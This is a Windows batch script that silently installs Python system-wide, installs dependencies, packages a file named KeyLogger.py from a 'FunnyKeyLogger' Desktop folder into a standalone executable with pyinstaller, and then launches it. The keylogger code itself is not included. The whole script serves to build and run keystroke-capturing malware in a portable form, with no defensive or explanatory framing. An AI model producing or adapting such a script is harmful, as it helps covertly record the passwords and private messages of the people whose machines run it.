@echo off

:: Download and silently install Python
curl https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -o python_install.exe

python_install.exe /quiet InstallAllUsers=1 PrependPath=1

:: Install dependencies using pip
py -m pip install -r requirements.txt

:: Set the desktop path and navigate to FunnyKeyLogger folder
set desktopPath=%USERPROFILE%\Desktop
cd /d %desktopPath%\FunnyKeyLogger

:: Use pyinstaller to package the KeyLogger.py file
pyinstaller --onefile KeyLogger.py

:: Navigate to the dist folder and run the executable
cd /d %desktopPath%\FunnyKeyLogger\dist\
KeyLogger.exe

pause

